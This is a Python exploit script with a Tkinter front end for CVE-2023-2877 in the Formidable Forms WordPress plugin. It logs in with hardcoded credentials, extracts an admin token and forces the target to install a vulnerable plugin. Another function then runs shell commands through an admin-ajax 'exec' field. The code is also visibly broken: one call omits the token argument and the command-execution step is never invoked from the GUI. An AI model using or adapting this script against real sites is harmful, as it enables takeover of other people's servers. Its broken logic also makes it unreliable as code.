#!/usr/bin/env python3

#
# Formidable Forms < 6.3.1 - Subscriber+ Remote Code Execution
# CVE-2023-2877
#

import argparse
import requests
import re
import os
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def Subscriber():
    root = tkinter.Tk()
    root.title("CVE-2023-2877 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        url = inp
        cmd = 'id'
        plugin = 'wp-upg.2.19.zip'
        requests.packages.urllib3.disable_warnings()
        session = requests.Session()
# Setting User-Agent for all requests.
        user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
        session.headers.update({'User-Agent': user_agent})

        def login_wordpress(url):
            login_data = {
                'log': 'root',
                'pwd': 'root',
                'wp-submit': 'Log In',
                'redirect_to': '/wp-admin/',
            }
            try:
                response = session.post(url + '/wp-login.php', data=login_data, verify=False)
                response.raise_for_status()

        # Check if logged in successfully
                if any('wordpress_logged_in' in cookie.name for cookie in session.cookies):
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
                    txtarea.insert(END, 'Successfully logged in.')
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')
                    #print('Successfully logged in.')
                else:
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
                    txtarea.insert(END, 'Failed to log in.')
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')

                    #print('Failed to log in.')
            except requests.exceptions.RequestException as e:
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, 'Error occurred while logging in:', str(e))
                txtarea.insert(END, str(e))
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')

               # print('Error occurred while logging in:', str(e))

            return session

        def extract_token(session, url):
    # Visit the specified page and extract the token
            try:
                response = session.get(url, verify=False)
                response.raise_for_status()

                token = re.search(r"token=(\w+)", response.text).group(1)
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, f'Token extracted: {token}')
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')

                #print(f'Token extracted: {token}')
                return token
            except requests.exceptions.RequestException as e:
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, 'If a 403 status code returned the Plugin is not installed / activted / vulnerable.\n')
                txtarea.insert(END, 'Error occurred while extracting token:\n')
                txtarea.insert(END, str(e))
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')

               # print('If a 403 status code returned the Plugin is not installed / activted / vulnerable.')
               # print('Error occurred while extracting token:', str(e))
               # exit()

            return None

        def install_plugin(session, url, token,plugin):
    # Install the plugin using the extracted token
            plugin_url = f"{url}/wp-json/frm-admin/v1/install-addon?token={token}&file_url=https://downloads.wordpress.org/plugin/{plugin}"
            try:
                response = session.get(plugin_url, verify=False)

                if response.status_code == 200:
                    if "Destination folder already exists" in response.text:
                        scroll_y = Scrollbar(root, orient=VERTICAL)
                        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                        scroll_y.pack(side=RIGHT, fill=Y)
                        scroll_y.config(command=txtarea.yview)
                        txtarea.insert(END, 'Plugin Already Installed.\n')
                        txtarea.pack(fill=BOTH, expand=True)
                        txtarea.configure(state ='disabled')

                     # print("Plugin Already Installed.")
                    else:
                        scroll_y = Scrollbar(root, orient=VERTICAL)
                        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                        scroll_y.pack(side=RIGHT, fill=Y)
                        scroll_y.config(command=txtarea.yview)
                        txtarea.insert(END, 'Plugin installed successfully.\n')
                        txtarea.insert(END, 'Now run exploit script with cmd / -c and command.\n')
                        txtarea.pack(fill=BOTH, expand=True)
                        txtarea.configure(state ='disabled')

                      #print('Plugin installed successfully.')
                     # print('Now run exploit script with cmd / -c and command.')
                else:
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
                    txtarea.insert(END, 'Failed to install the plugin.')
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')

                   # print('Failed to install the plugin.')
            except requests.exceptions.RequestException as e:
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, 'Error occurred while installing plugin:')
                txtarea.insert(END, str(e))
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')

                #print('Error occurred while installing plugin:', str(e))

        def execute_ajax_request(url, cmd):
    # Execute AJAX request with cmd value
            ajax_url = f"{url}/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:{cmd}:NULL:NULL"
            try:
                response = session.get(ajax_url, verify=False)
                if response.status_code == 400:
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
                    txtarea.insert(END, "Vulnerable Plugin for RCE is not installed.")
                    txtarea.insert(END, "Run Script with out cmd / -c to install vulnerable plugin for RCE.")
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')

                  # print("Vulnerable Plugin for RCE is not installed.")
                   #print("Run Script with out cmd / -c to install vulnerable plugin for RCE.")
                  # exit()
                response.raise_for_status()
        # Parse the JSON response
                data = response.json()
                if 'data' in data:
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
                    txtarea.insert(END, "Data:")
                    txtarea.insert(END, data['data'])
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')

                   # print("Data:")
                    #print(data['data'])
                else:
                    scroll_y = Scrollbar(root, orient=VERTICAL)
                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                    scroll_y.pack(side=RIGHT, fill=Y)
                    scroll_y.config(command=txtarea.yview)
                    txtarea.insert(END, "No data found.")
                    txtarea.pack(fill=BOTH, expand=True)
                    txtarea.configure(state ='disabled')

                    #print("No data found.")
            except requests.exceptions.RequestException as e:
                scroll_y = Scrollbar(root, orient=VERTICAL)
                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
                scroll_y.pack(side=RIGHT, fill=Y)
                scroll_y.config(command=txtarea.yview)
                txtarea.insert(END, 'Error occurred while executing AJAX request:')
                txtarea.insert(END, str(e))
                txtarea.pack(fill=BOTH, expand=True)
                txtarea.configure(state ='disabled')
                #print('Error occurred while executing AJAX request:', str(e))

        session = login_wordpress(url)
        admin_page_url = f"{url}/wp-admin/admin.php?page=formidable-welcome"
        token = extract_token(session, admin_page_url)
        install_plugin(session, url, plugin)

    Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()

'''
def main():
    parser = argparse.ArgumentParser(description='CVE-2023-2877 - Formidable Forms < 6.3.1 - Subscriber+ Remote Code Execution Script')
    parser.add_argument('-w', '--url', required=True, help='WordPress site URL')
    parser.add_argument('-u', '--username', required=True, help='WordPress username')
    parser.add_argument('-p', '--password', required=True, help='WordPress password')
    parser.add_argument('-pl', '--plugin', required=False, default="wp-upg.2.19.zip", help='Different Plugin to Install i.e mstore-api.3.9.0.zip')
    parser.add_argument('-c', '--cmd', required=False, help='Command value')

    args = parser.parse_args()

    
    if args.cmd:
        execute_ajax_request(args.url, args.cmd)
    else:
        session = login_wordpress(args.url, args.username, args.password)
        admin_page_url = f"{args.url}/wp-admin/admin.php?page=formidable-welcome"
        token = extract_token(session, admin_page_url)
        install_plugin(session, args.url, token,args.plugin)
    

if __name__ == '__main__':
    main()
'''
